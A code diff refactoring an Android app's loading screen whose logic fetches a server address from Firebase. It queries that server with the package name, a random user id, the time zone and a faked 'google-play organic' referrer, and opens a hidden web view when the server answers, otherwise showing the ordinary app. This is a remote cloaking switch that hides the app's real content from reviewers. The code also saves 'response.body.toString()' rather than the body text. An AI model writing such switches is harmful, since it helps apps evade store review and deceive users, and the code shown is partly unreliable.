@@ -7,6 +7,7 @@ import android.content.pm.PackageManager
 import android.net.ConnectivityManager
 import android.os.Build
 import android.os.Bundle
+import android.util.Log
 import android.widget.Toast
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
@@ -54,38 +55,39 @@ class LoadingActivity : AppCompatActivity() {
         binding = ActivityLoadingBinding.inflate(layoutInflater)
         setContentView(binding.root)
 
+        askNotificationPermission()
         firebaseAnalytics = Firebase.analytics
 
-        askNotificationPermission()
-
-        if (network()) {
-            if (getDomainPreferences().isNullOrEmpty()) {
+        if (isNetworkConnected()) {
+            if (fireStoreUrlNullOrEmpty()) {
                 database = Firebase.database.reference
 
                 database.child("db").child("link").get().addOnSuccessListener {
-                    val value = kotlin.runCatching { it.value.toString() }.getOrNull()
-                    saveDomainPreferences(value)
-                    if (value.isNullOrEmpty()) {
+                    val fireStoreUrl = kotlin.runCatching { it.value.toString() }.getOrNull()
+                    saveFireStoreUrPreferences(fireStoreUrl)
+                    if (fireStoreUrl.isNullOrEmpty()) {
                         startMainActivity()
                     } else {
-                        handleDomain(value)
+                        makeRestApiRequest(fireStoreUrl)
                     }
                 }
             } else {
-                if (getUrlPreferences().isNullOrEmpty()) {
-                    startMainActivity()
-                } else {
+                if (isFinalUrlExists()) {
                     startWebActivity()
-                }
+                } else startMainActivity()
             }
+
         } else {
-            startMainActivity()
+            if (isFinalUrlExists()) {
+                startWebActivity()
+            } else {
+                startMainActivity()
+            }
         }
     }
 
-    private fun handleDomain(domain: String?) {
-
-        val url = "$domain/?packageid=$packageName" +
+    private fun makeRestApiRequest(fireStoreUrl: String?) {
+        val url = "$fireStoreUrl/?packageid=$packageName" +
                 "&usserid=${UUID.randomUUID()}" +
                 "&getz=${URLEncoder.encode(TimeZone.getDefault().id, "UTF-8")}" +
                 "&getr=utm_source=google-play&utm_medium=organic"
@@ -103,40 +105,47 @@ class LoadingActivity : AppCompatActivity() {
             }
 
             override fun onResponse(call: Call, response: Response) {
-                response.use {
-                    if (response.isSuccessful) {
-                        saveUrlPreferences(response.body.toString())
-                        startWebActivity()
-                    } else {
-                        startMainActivity()
-                    }
+                if (response.isSuccessful) {
+                    saveFinalUrlPreferences(response.body.toString())
+                    startWebActivity()
+                } else {
+                    Log.d("xxx", "onResponse")
+                    startMainActivity()
                 }
             }
         })
     }
 
-    private fun saveDomainPreferences(domain: String?) {
+    private fun saveFireStoreUrPreferences(domain: String?) {
         val preferences = getSharedPreferences("domain_preferences", Context.MODE_PRIVATE)
         val editor = preferences.edit()
         editor.putString("key_domain", domain)
         editor.apply()
     }
 
-    private fun getDomainPreferences(): String? {
+    private fun getFireStoreUrlNullOrEmptyPreferences(): String? {
         val preferences = getSharedPreferences("domain_preferences", Context.MODE_PRIVATE)
         return preferences.getString("key_domain", null)
     }
 
-    private fun saveUrlPreferences(url: String?) {
+    private fun fireStoreUrlNullOrEmpty(): Boolean {
+        return getFireStoreUrlNullOrEmptyPreferences().isNullOrEmpty()
+    }
+
+    private fun saveFinalUrlPreferences(url: String?) {
         val preferences = getSharedPreferences("url_preferences", Context.MODE_PRIVATE)
         val editor = preferences.edit()
         editor.putString("url_key", url)
         editor.apply()
     }
 
-    private fun getUrlPreferences(): String? {
+    private fun getFinalUrlPreferences(): String? {
         val preferences = getSharedPreferences("url_preferences", Context.MODE_PRIVATE)
         return preferences.getString("url_key", null)
+    }
+
+    private fun isFinalUrlExists(): Boolean {
+        return !getFinalUrlPreferences().isNullOrEmpty()
     }
 
     private fun startMainActivity() {
@@ -145,12 +154,14 @@ class LoadingActivity : AppCompatActivity() {
     }
 
     private fun startWebActivity() {
-        val intent = Intent(this@LoadingActivity, WebActivity::class.java)
-        intent.putExtra("url", "${getUrlPreferences()}")
-        startActivity(intent)
+        WebActivity.start(
+            this@LoadingActivity,
+            getFinalUrlPreferences() ?: error("Must not be null")
+        )
+
     }
 
-    private fun network(): Boolean {
+    private fun isNetworkConnected(): Boolean {
         val connectivityManager =
             getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
         val networkInfo = connectivityManager.activeNetworkInfo
